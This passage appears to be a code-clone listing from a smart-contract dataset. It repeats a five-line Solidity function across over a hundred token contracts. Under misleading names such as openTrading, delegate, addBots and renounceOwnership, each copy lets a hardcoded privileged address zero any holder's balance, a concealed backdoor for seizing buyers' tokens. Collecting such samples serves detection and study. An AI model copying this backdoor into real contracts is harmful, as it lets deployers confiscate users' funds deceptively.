        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="39" endline="43" pcid="8904">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x958e1604174Ea6BD0932ca9E577f01088499897a.sol" startline="39" endline="43" pcid="5441">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="39" endline="43" pcid="9014">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="33" endline="37" pcid="3720">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf34839a7431d6c70673f3a3bcfb589c042fd219d.sol" startline="32" endline="36" pcid="8844">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="36" endline="40" pcid="5366">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="655" endline="659" pcid="6818">
    function renounceOwnership(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4c143f140ee6C2E0c0f6125b3133DC67C9D95856.sol" startline="38" endline="42" pcid="2845">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="36" endline="40" pcid="5085">
    function addbot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xCe07F8b4f1964E69cc6d52B7A8C4B07496CC4143.sol" startline="37" endline="41" pcid="7319">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="39" endline="43" pcid="2427">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="39" endline="43" pcid="7706">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x515Eab35fB6F9687e0D6cd8B796aEF5E7d15064F.sol" startline="363" endline="367" pcid="3020">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="39" endline="43" pcid="3381">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="38" endline="42" pcid="8592">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x50F33884A82D799A14bEF3636523e6E9c761D9DD.sol" startline="37" endline="41" pcid="2999">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="38" endline="42" pcid="2281">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x75d5d49F80871F23bEE1448070790A77C56d3d00.sol" startline="33" endline="37" pcid="4356">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="38" endline="42" pcid="852">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="36" endline="40" pcid="2058">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="38" endline="42" pcid="6158">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="39" endline="43" pcid="4325">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="37" endline="41" pcid="953">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="39" endline="43" pcid="3752">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="40" endline="44" pcid="8402">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="35" endline="39" pcid="6257">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="40" endline="44" pcid="4735">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA84aFAFf03113A740F0572E617d5972654F0dA4F.sol" startline="37" endline="41" pcid="6143">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x99D00D99221a9CFF03d0F48a6674b71A7d0893Fc.sol" startline="31" endline="35" pcid="5584">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xcd8bdb2857ea0948122ccb9b17fc2a6d721b97ae.sol" startline="37" endline="41" pcid="7289">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xDe77F59a385B50d78aeB7C646d9dF1E4fD76f1a4.sol" startline="40" endline="44" pcid="7937">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="39" endline="43" pcid="3419">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="39" endline="43" pcid="4148">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="37" endline="41" pcid="6242">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="39" endline="43" pcid="1824">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xbb23847f2A80451AFEBB0D0b48Ab6164E3bA2349.sol" startline="35" endline="39" pcid="6741">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3D9efe658017c9f4e19E61c4dE211FB55B0E47d6.sol" startline="32" endline="36" pcid="2226">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="37" endline="41" pcid="7273">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="36" endline="40" pcid="7691">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="39" endline="43" pcid="6888">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="38" endline="42" pcid="300">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="39" endline="43" pcid="1994">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="37" endline="41" pcid="2636">
    function delegateBot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x700ab19C3D9FA23d1A194761eddD9986Aa620293.sol" startline="37" endline="41" pcid="4100">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xBD0DC4FC7a2797cA0bD2F0b8c792a8BF8dd96358.sol" startline="38" endline="42" pcid="6756">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x17A5c49Cb48bf49cc10D1Ec05fE899Bb447811Fd.sol" startline="37" endline="41" pcid="708">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7E6d55c8dF6E82AfbC76620561cFB99196aC090c.sol" startline="36" endline="40" pcid="4684">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="41" endline="45" pcid="2567">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5775071e01A9A3FC99484b55dF24541AFccDDe5C.sol" startline="36" endline="40" pcid="3281">
    function delegateBot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="38" endline="42" pcid="2260">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="36" endline="40" pcid="3919">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="37" endline="41" pcid="3542">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="39" endline="43" pcid="7659">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xB264455716277D6D1445A4B875efAb6DE8931F4a.sol" startline="35" endline="39" pcid="6531">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="37" endline="41" pcid="5179">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="33" endline="37" pcid="1892">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="39" endline="43" pcid="4395">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="37" endline="41" pcid="1517">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="38" endline="42" pcid="5461">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="34" endline="38" pcid="8387">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="34" endline="38" pcid="8607">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe022f7a1F743C18e28ABa062FCFa0746CbaE8d32.sol" startline="35" endline="39" pcid="8012">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="39" endline="43" pcid="8664">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="35" endline="39" pcid="5381">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="38" endline="42" pcid="4599">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="36" endline="40" pcid="3126">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="38" endline="42" pcid="1287">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="39" endline="43" pcid="2696">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="37" endline="41" pcid="1272">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="41" endline="45" pcid="2192">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="36" endline="40" pcid="133">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="36" endline="40" pcid="7922">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe6306Af140F6eefa1d461Ff04a549D51FF4dd16B.sol" startline="35" endline="39" pcid="8312">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="35" endline="39" pcid="7644">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="80" endline="84" pcid="791">
    function openTrading(address bots) external {
        if(adm == msg.sender && adm != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xAA8c3d64b1AE2c912151FE7ee55eEEfb22b52cba.sol" startline="39" endline="43" pcid="6207">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9a5d0F32B00BDB418D7667AE36d36eA15FDe594e.sol" startline="37" endline="41" pcid="5622">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="655" endline="659" pcid="2207">
    function renounceOwnership(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="37" endline="41" pcid="5954">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1A2d73a3c991da558bcAeE1f02408fe5a9471afa.sol" startline="36" endline="40" pcid="827">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="40" endline="44" pcid="441">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="39" endline="43" pcid="1675">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="38" endline="42" pcid="5776">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="363" endline="367" pcid="9306">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="35" endline="39" pcid="6128">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3769cd9532CcE8550984AA8388a26Beda0E69401.sol" startline="41" endline="45" pcid="1858">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="38" endline="42" pcid="3201">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="35" endline="39" pcid="89">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="39" endline="43" pcid="255">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="37" endline="41" pcid="1176">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="36" endline="40" pcid="6372">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8227de806a54ce72c23fab6f175d80d688536d7a.sol" startline="36" endline="40" pcid="4865">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x33F474718b13546c5A717Ff1Fbd2d8BcaB6Fdd45.sol" startline="37" endline="41" pcid="1589">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x13d0A3A7D4Ca790E93874a93ED664a301291bBEe.sol" startline="36" endline="40" pcid="526">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="33" endline="37" pcid="3266">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="40" endline="44" pcid="7853">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="40" endline="44" pcid="8700">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="38" endline="42" pcid="7465">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6e45ced3238f28085a8a9e8d93e273013ad9d5a4.sol" startline="35" endline="39" pcid="4039">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6495b9266304551eBa87fF9aD9c407Efd3c0a71c.sol" startline="35" endline="39" pcid="3797">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x53f9c54a9Ec424790E908df9068d746F6A25DE6A.sol" startline="41" endline="45" pcid="3111">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="34" endline="38" pcid="889">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x52739F8b5C2bCD8290403e21463615B8B952f049.sol" startline="37" endline="41" pcid="3051">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="36" endline="40" pcid="7258">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5f4B753ddeb0Bc2f78D4bE446994BF0C0497D98e.sol" startline="39" endline="43" pcid="3590">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="36" endline="40" pcid="5918">
    function openTrading(address bots) external {
